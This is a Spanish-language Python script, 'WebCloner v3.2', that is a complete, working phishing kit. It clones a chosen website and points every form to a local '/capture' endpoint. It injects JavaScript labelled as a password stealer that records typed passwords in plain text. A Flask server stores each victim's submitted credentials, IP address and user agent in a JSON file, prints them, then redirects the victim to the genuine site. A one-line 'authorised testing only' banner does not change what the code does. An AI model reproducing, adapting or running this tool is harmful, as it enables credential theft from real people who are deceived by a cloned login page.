#!/usr/bin/env python3
#WebCloner v3.2

import os
import sys
import json
import re
from datetime import datetime
from urllib.parse import urljoin, urlparse
import warnings
import shutil
import time

warnings.filterwarnings('ignore')

try:
    import requests
    from bs4 import BeautifulSoup
    from flask import Flask, request, redirect, send_from_directory
except ImportError:
    print("[*] Instalando dependencias...")
    os.system("pip3 install requests beautifulsoup4 flask lxml -q")
    import requests
    from bs4 import BeautifulSoup
    from flask import Flask, request, redirect, send_from_directory

try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

class TemplateManager:
    """Gestor de plantillas guardadas"""
    
    def __init__(self, templates_file="templates.json"):
        self.templates_file = os.path.join(BASE_DIR, templates_file)
        self.templates = self._load_templates()
    
    def _load_templates(self):
        if os.path.exists(self.templates_file):
            try:
                with open(self.templates_file, 'r') as f:
                    return json.load(f)
            except:
                return []
        return []
    
    def save_template(self, url, directory):
        abs_directory = os.path.join(BASE_DIR, directory)
        template = {
            'url': url,
            f'directory': abs_directory,
            'created': datetime.now().isoformat()
        }
        self.templates.append(template)
        with open(self.templates_file, 'w') as f:
            json.dump(self.templates, f, indent=2)
    
    def list_templates(self):
        return self.templates
    
    def get_template(self, index):
        if 0 <= index < len(self.templates):
            return self.templates[index]
        return None
    
    def delete_template(self, index):
        if 0 <= index < len(self.templates):
            template = self.templates.pop(index)
            if os.path.exists(template['directory']):
                shutil.rmtree(template['directory'])
            with open(self.templates_file, 'w') as f:
                json.dump(self.templates, f, indent=2)
            return True
        return False


class WebCloner:
    """Clonador rapido y robusto de paginas web"""
    
    def __init__(self, target_url, output_dir="cloned_site", timeout=30, retries=3):
        self.output_dir = os.path.join(BASE_DIR, output_dir)
        self.timeout = timeout
        self.retries = retries
        
        # Crear sesion con configuracion robusta
        self.session = requests.Session()
        self.session.verify = False
        
        # Configurar adapter con reintentos
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        retry_strategy = Retry(
            total=retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Headers ultra-realistas
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'es-MX,es;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
        
        self.target_url = self._normalize_url(target_url)

        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir, exist_ok=True)
    
    def _normalize_url(self, url):
        """Normaliza URL con multiples intentos"""
        url = url.strip()
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        parsed = urlparse(url)
        domain = parsed.netloc
        path = parsed.path or '/'
        
        # Generar variantes
        if domain.startswith('www.'):
            base_domain = domain.replace('www.', '', 1)
            variants = [
                f"https://www.{base_domain}{path}",
                f"https://{base_domain}{path}",
                f"http://www.{base_domain}{path}",
                f"http://{base_domain}{path}"
            ]
        else:
            variants = [
                f"https://www.{domain}{path}",
                f"https://{domain}{path}",
                f"http://www.{domain}{path}",
                f"http://{domain}{path}"
            ]
        
        print(f"[*] Probando {len(variants)} variantes...")
        
        for i, variant in enumerate(variants, 1):
            for attempt in range(self.retries):
                try:
                    print(f"[{i}/{len(variants)}] Intento {attempt+1}/{self.retries}: {variant}")
                    
                    response = self.session.get(
                        variant, 
                        timeout=self.timeout,
                        allow_redirects=True,
                        verify=False,
                        stream=False
                    )
                    
                    if response.status_code == 200:
                        final_url = response.url
                        print(f"[+] CONECTADO: {final_url}")
                        print(f"[+] Status: {response.status_code}")
                        print(f"[+] Tamano: {len(response.content)} bytes")
                        return final_url
                    else:
                        print(f"    [-] HTTP {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    print(f"    [-] Timeout (esperando {self.timeout}s)")
                    if attempt < self.retries - 1:
                        time.sleep(2)
                        
                except requests.exceptions.SSLError:
                    print(f"    [-] Error SSL")
                    break
                    
                except requests.exceptions.ConnectionError as e:
                    print(f"    [-] Error de conexion")
                    if attempt < self.retries - 1:
                        time.sleep(2)
                        
                except Exception as e:
                    print(f"    [-] Error: {str(e)[:50]}")
                    break
        
        print(f"\n[-] No se pudo conectar a ninguna variante")
        print(f"[*] Usando URL original: {variants[0]}")
        return variants[0]
    
    def clone(self):
        """Clona la pagina web"""
        try:
            print(f"\n[*] Descargando pagina...")
            print(f"[*] URL: {self.target_url}")
            print(f"[*] Timeout: {self.timeout}s")
            
            for attempt in range(self.retries):
                try:
                    print(f"\n[*] Intento {attempt+1}/{self.retries}")
                    
                    response = self.session.get(
                        self.target_url,
                        timeout=self.timeout,
                        allow_redirects=True,
                        verify=False,
                        stream=False
                    )
                    
                    if response.status_code == 200:
                        break
                    else:
                        print(f"[-] HTTP {response.status_code}")
                        if attempt < self.retries - 1:
                            print(f"[*] Reintentando en 3 segundos...")
                            time.sleep(3)
                            
                except requests.exceptions.Timeout:
                    print(f"[-] Timeout despues de {self.timeout} segundos")
                    if attempt < self.retries - 1:
                        print(f"[*] Reintentando con timeout aumentado...")
                        self.timeout += 10
                        time.sleep(2)
                    else:
                        print(f"\n[-] FALLO: Todos los intentos agotados")
                        print(f"[!] Posibles causas:")
                        print(f"    - Sitio muy lento o sobrecargado")
                        print(f"    - Proteccion anti-bot activa")
                        print(f"    - Conexion a internet lenta")
                        print(f"\n[*] Sugerencias:")
                        print(f"    - Aumenta el timeout: python clon.py --timeout 60")
                        print(f"    - Verifica tu conexion: ping {urlparse(self.target_url).netloc}")
                        print(f"    - Prueba con otro sitio mas rapido")
                        return False
                        
                except Exception as e:
                    print(f"[-] Error: {e}")
                    if attempt < self.retries - 1:
                        time.sleep(2)
                    else:
                        return False
            
            if response.status_code != 200:
                # Intento final con User-Agent movil
                print(f"\n[*] Intento final con User-Agent movil...")
                self.session.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15'
                
                response = self.session.get(
                    self.target_url,
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False
                )
                
                if response.status_code != 200:
                    print(f"[-] Error HTTP {response.status_code}")
                    return False
            
            # Actualizar URL final
            self.target_url = response.url
            parsed_url = urlparse(self.target_url)
            self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            print(f"\n[+] Descarga exitosa")
            print(f"[+] URL final: {self.target_url}")
            print(f"[+] Tamano: {len(response.content)} bytes")
            print(f"[+] Content-Type: {response.headers.get('Content-Type', 'unknown')}")
            
            # Parse HTML
            print(f"\n[*] Parseando HTML...")
            soup = BeautifulSoup(response.content, 'lxml')
            
            # Modificar formularios
            print(f"[*] Modificando formularios...")
            forms_found = self._modify_forms(soup)
            print(f"[+] Formularios modificados: {forms_found}")
            
            # INYECTAR JAVASCRIPT PARA CAPTURAR PASSWORDS EN TEXTO PLANO
            print(f"[*] Inyectando capturador de passwords...")
            self._inject_password_stealer(soup)
            print(f"[+] Capturador inyectado")
            
            # Arreglar URLs
            print(f"[*] Convirtiendo URLs a absolutas...")
            self._fix_resources_fast(soup)
            print(f"[+] URLs convertidas")
            
            # Guardar
            output_path = os.path.join(self.output_dir, 'index.html')
            print(f"[*] Guardando HTML...")
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            print(f"[+] Guardado: {output_path}")
            print(f"[+] Clonacion completada exitosamente")
            
            return True
            
        except KeyboardInterrupt:
            print(f"\n[!] Operacion cancelada por el usuario")
            return False
            
        except Exception as e:
            print(f"\n[-] Error inesperado: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _modify_forms(self, soup):
        """Modifica formularios"""
        forms = soup.find_all('form')
        for form in forms:
            form['action'] = '/capture'
            form['method'] = 'POST'
            # NO eliminar onsubmit, lo usaremos
            for attr in ['data-action', 'target']:
                if attr in form.attrs:
                    del form[attr]
        return len(forms)
    
    def _inject_password_stealer(self, soup):
        """
        INYECTA JAVASCRIPT QUE CAPTURA PASSWORDS EN TEXTO PLANO
        ANTES DE QUE SE ENCRIPTEN
        """
        script = soup.new_tag('script')
        script.string = """
// CAPTURADOR DE PASSWORDS EN TEXTO PLANO
(function() {
    console.log('[STEALER] Iniciando capturador de passwords...');
    
    // Capturar todos los formularios
    var forms = document.querySelectorAll('form');
    
    forms.forEach(function(form) {
        // Interceptar el submit
        form.addEventListener('submit', function(e) {
            console.log('[STEALER] Formulario enviado, capturando datos...');
            
            // Capturar TODOS los campos del formulario
            var formData = new FormData(form);
            var plainData = {};
            
            // Obtener valores de todos los inputs
            var inputs = form.querySelectorAll('input, textarea, select');
            inputs.forEach(function(input) {
                if (input.name) {
                    // CAPTURAR VALOR REAL DEL CAMPO
                    var value = input.value;
                    plainData[input.name + '_PLAIN'] = value;
                    
                    console.log('[STEALER] Campo capturado: ' + input.name + ' = ' + value);
                }
            });
            
            // Añadir los datos en texto plano al formulario
            for (var key in plainData) {
                var hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = key;
                hiddenInput.value = plainData[key];
                form.appendChild(hiddenInput);
            }
            
            console.log('[STEALER] Datos capturados:', plainData);
        }, true); // true = capturar en fase de captura
        
        // También capturar en tiempo real mientras el usuario escribe
        var passwordInputs = form.querySelectorAll('input[type="password"]');
        passwordInputs.forEach(function(pwdInput) {
            var realPassword = '';
            
            pwdInput.addEventListener('input', function(e) {
                realPassword = pwdInput.value;
                console.log('[STEALER] Password actualizada: ' + realPassword);
                
                // Guardar en un campo oculto
                var hiddenPwd = document.getElementById('captured_pwd_plain');
                if (!hiddenPwd) {
                    hiddenPwd = document.createElement('input');
                    hiddenPwd.type = 'hidden';
                    hiddenPwd.id = 'captured_pwd_plain';
                    hiddenPwd.name = 'PASSWORD_PLAIN_TEXT';
                    form.appendChild(hiddenPwd);
                }
                hiddenPwd.value = realPassword;
            });
        });
    });
    
    console.log('[STEALER] Capturador instalado en ' + forms.length + ' formularios');
})();
"""
        # Insertar al final del body
        if soup.body:
            soup.body.append(script)
        else:
            if soup.html:
                soup.html.append(script)
            else:
                soup.append(script)
    
    def _fix_resources_fast(self, soup):
        """Arreglar URLs rapido"""
        
        # src y href
        for tag in soup.find_all(['img', 'script', 'link', 'iframe', 'video', 'audio', 'source']):
            for attr in ['src', 'href']:
                if tag.get(attr):
                    url = tag[attr]
                    if not url.startswith(('http://', 'https://', 'data:', '//', '#', 'javascript:', 'mailto:', 'tel:')):
                        tag[attr] = urljoin(self.base_url, url)
        
        # srcset
        for tag in soup.find_all(['img', 'source']):
            if tag.get('srcset'):
                srcset_items = []
                for item in tag['srcset'].split(','):
                    parts = item.strip().split()
                    if parts:
                        url = parts[0]
                        if not url.startswith(('http://', 'https://', 'data:', '//')):
                            url = urljoin(self.base_url, url)
                        srcset_items.append(url + (' ' + ' '.join(parts[1:]) if len(parts) > 1 else ''))
                tag['srcset'] = ', '.join(srcset_items)
        
        # CSS inline
        for tag in soup.find_all(style=True):
            style = tag['style']
            style = re.sub(
                r'url\(["\']?([^"\'()]+)["\']?\)',
                lambda m: f'url({urljoin(self.base_url, m.group(1))})' if not m.group(1).startswith(('http', 'data:', '//', '#')) else m.group(0),
                style
            )
            tag['style'] = style


class PhishingServer:
    """Servidor Flask"""
    
    def __init__(self, cloned_dir, target_url, port=8080):
        self.cloned_dir = os.path.join(BASE_DIR, cloned_dir)
        self.target_url = target_url
        self.port = port
        self.credentials_file = os.path.join(BASE_DIR, "captured_credentials.json")
        self.app = Flask(__name__)
        
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        
        self._setup_routes()
    
    def _setup_routes(self):
        
        @self.app.route('/')
        def index():
            return send_from_directory(self.cloned_dir, 'index.html')
        
        @self.app.route('/<path:filename>')
        def serve_file(filename):
            try:
                return send_from_directory(self.cloned_dir, filename)
            except:
                return send_from_directory(self.cloned_dir, 'index.html')
        
        @self.app.route('/capture', methods=['POST', 'GET'])
        def capture():
            try:
                credentials = {}
                
                if request.method == 'POST':
                    credentials.update(request.form.to_dict())
                    if request.is_json:
                        credentials.update(request.get_json())
                    if not credentials:
                        raw_data = request.get_data(as_text=True)
                        if raw_data:
                            credentials['raw_data'] = raw_data
                
                credentials.update(request.args.to_dict())
                
                capture_data = {
                    'timestamp': datetime.now().isoformat(),
                    'ip': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent', 'Unknown'),
                    'method': request.method,
                    'credentials': credentials
                }
                
                self._save_credentials(capture_data)
                self._display_capture(capture_data)
                
                return redirect(self.target_url, code=302)
                
            except Exception as e:
                print(f"[-] Error captura: {e}")
                return redirect(self.target_url, code=302)
        
        @self.app.errorhandler(404)
        def not_found(e):
            return send_from_directory(self.cloned_dir, 'index.html')
    
    def _save_credentials(self, data):
        try:
            if os.path.exists(self.credentials_file):
                with open(self.credentials_file, 'r', encoding='utf-8') as f:
                    all_creds = json.load(f)
            else:
                all_creds = []
            
            all_creds.append(data)
            
            with open(self.credentials_file, 'w', encoding='utf-8') as f:
                json.dump(all_creds, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[-] Error al guardar: {e}")
    
    def _display_capture(self, data):
        """
        MUESTRA TODAS LAS CREDENCIALES
        BUSCA PASSWORD EN TEXTO PLANO
        """
        print("\n" + "="*70)
        print("  CREDENCIALES CAPTURADAS".center(70))
        print("="*70)
        print(f"Timestamp: {data['timestamp']}")
        print(f"IP: {data['ip']}")
        print(f"Method: {data['method']}")
        print(f"User-Agent: {data['user_agent'][:60]}...")
        
        if data['credentials']:
            print(f"\nTODOS LOS DATOS CAPTURADOS:")
            print("-" * 70)
            
            # Buscar password en texto plano
            password_plain = None
            email_plain = None
            
            for key, value in data['credentials'].items():
                valor_str = str(value)
                print(f"   {key}: {valor_str}")
                
                # Detectar password en texto plano
                if 'PASSWORD_PLAIN_TEXT' in key or key.endswith('_PLAIN'):
                    if 'pass' in key.lower() or 'pwd' in key.lower():
                        password_plain = valor_str
                
                # Detectar email
                if 'email' in key.lower() or 'user' in key.lower() or key.endswith('_PLAIN'):
                    if '@' in valor_str or 'email' in key.lower():
                        email_plain = valor_str
            
            print("-" * 70)
            
            # RESALTAR CREDENCIALES EN TEXTO PLANO
            if password_plain or email_plain:
                print("\n" + "="*70)
                print("  CREDENCIALES EN TEXTO PLANO CAPTURADAS".center(70))
                print("="*70)
                
                if email_plain:
                    print(f"EMAIL/USUARIO: {email_plain}")
                
                if password_plain:
                    print(f"PASSWORD: {password_plain}")
                else:
                    print(f"PASSWORD: (no capturada en texto plano)")
                
                print("="*70)
            else:
                print("\n[!] No se encontraron credenciales en texto plano")
                print("[!] Mostrando todos los campos capturados arriba")
        else:
            print(f"\nNo se capturaron datos en el formulario")
        
        print("="*70 + "\n")
    
    def start(self):
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"
        
        print("\n" + "="*70)
        print("  SERVIDOR PHISHING ACTIVO".center(70))
        print("="*70)
        print(f"Servidor: http://0.0.0.0:{self.port}")
        print(f"IP Local: http://{local_ip}:{self.port}")
        print(f"Target: {self.target_url}")
        print(f"\nEsperando victimas...")
        print(f"Presiona Ctrl+C para detener")
        print(f"\nNOTA: JavaScript capturara passwords ANTES de encriptarse")
        print("="*70 + "\n")
        
        try:
            self.app.run(host='0.0.0.0', port=self.port, debug=False, threaded=True)
        except KeyboardInterrupt:
            print("\n[*] Servidor detenido")
        except OSError as e:
            if 'Address already in use' in str(e):
                print(f"[-] Puerto {self.port} en uso")
                print(f"[*] Usa otro puerto o ejecuta:")
                print(f"    sudo lsof -ti:{self.port} | xargs kill -9")


def cleanup(template_manager, output_dir, save_template=False, target_url=None):
    """Limpieza al finalizar"""
    print("\n[*] Limpieza...")
    
    if save_template and target_url:
        template_manager.save_template(target_url, output_dir)
        print(f"[+] Plantilla guardada")
    
    choice = input("\n[?] Desea borrar archivos clonados? (s/n): ").strip().lower()
    
    if choice == 's':
        output_path = os.path.join(BASE_DIR, output_dir)
        if os.path.exists(output_path):
            shutil.rmtree(output_path)
            print(f"[+] Directorio {output_dir} eliminado")
        
        if os.path.exists("captured_credentials.json"):
            choice2 = input("[?] Borrar credenciales capturadas? (s/n): ").strip().lower()
            if choice2 == 's':
                os.remove("captured_credentials.json")
                print(f"[+] Credenciales eliminadas")
            else:
                print(f"[*] Credenciales guardadas en: captured_credentials.json")
    else:
        print(f"[*] Archivos conservados en: {output_dir}")


def show_templates(template_manager):
    """Mostrar plantillas guardadas"""
    templates = template_manager.list_templates()
    
    if not templates:
        return None
    
    print("\n" + "="*70)
    print("  PLANTILLAS GUARDADAS".center(70))
    print("="*70)
    
    for i, template in enumerate(templates):
        created = template['created'][:19].replace('T', ' ')
        print(f"\n[{i+1}] {template['url']}")
        print(f"    Directorio: {template['directory']}")
        print(f"    Creado: {created}")
    
    print("\n" + "="*70)
    
    choice = input("\n[?] Usar plantilla guardada? (numero/n): ").strip()
    
    if choice.lower() == 'n' or choice == '':
        return None
    
    try:
        index = int(choice) - 1
        template = template_manager.get_template(index)
        if template:
            return template
    except:
        pass
    
    return None


def banner():
    print("""
========================================================================
                WebCloner v3.2 - Plaintext Password Capture
========================================================================
  ADVERTENCIA: Solo para pruebas autorizadas
  Uso no autorizado es ILEGAL
========================================================================
""")


def main():
    banner()
    
    template_manager = TemplateManager()
    
    # Configuracion
    timeout = 30
    retries = 3
    
    # Argumentos de linea de comandos basicos
    if '--timeout' in sys.argv:
        try:
            idx = sys.argv.index('--timeout')
            timeout = int(sys.argv[idx + 1])
            print(f"[*] Timeout configurado: {timeout}s")
        except:
            pass
    
    if '--retries' in sys.argv:
        try:
            idx = sys.argv.index('--retries')
            retries = int(sys.argv[idx + 1])
            print(f"[*] Reintentos configurados: {retries}")
        except:
            pass
    
    try:
        # Mostrar plantillas guardadas
        template = show_templates(template_manager)
        
        if template:
            print(f"\n[*] Usando plantilla: {template['url']}")
            target_url = template['url']
            output_dir = template['directory']
            
            if not os.path.exists(os.path.join(output_dir, 'index.html')):
                print(f"[-] Archivos no existen, clonando de nuevo...")
                cloner = WebCloner(target_url, output_dir, timeout, retries)
                if not cloner.clone():
                    sys.exit(1)
                target_url = cloner.target_url
        else:
            print("\nEjemplos: ejemplo.com, https://ejemplo.com")
            target = input("\n[?] URL objetivo: ").strip()
            
            if not target:
                print("[-] URL requerida")
                sys.exit(1)
            
            output_dir = f"clone_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Clonar
            cloner = WebCloner(target, output_dir, timeout, retries)
            if not cloner.clone():
                print("\n[-] Fallo la clonacion")
                sys.exit(1)
            
            target_url = cloner.target_url
        
        port = input("\n[?] Puerto del servidor [8080]: ").strip()
        port = int(port) if port else 8080
        
        # Iniciar servidor
        server = PhishingServer(output_dir, target_url, port)
        server.start()
        
        # Cleanup al finalizar
        save_choice = input("\n[?] Guardar como plantilla? (s/n): ").strip().lower()
        cleanup(template_manager, output_dir, save_choice == 's', target_url)
        
    except KeyboardInterrupt:
        print("\n\n[*] Operacion cancelada por el usuario")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
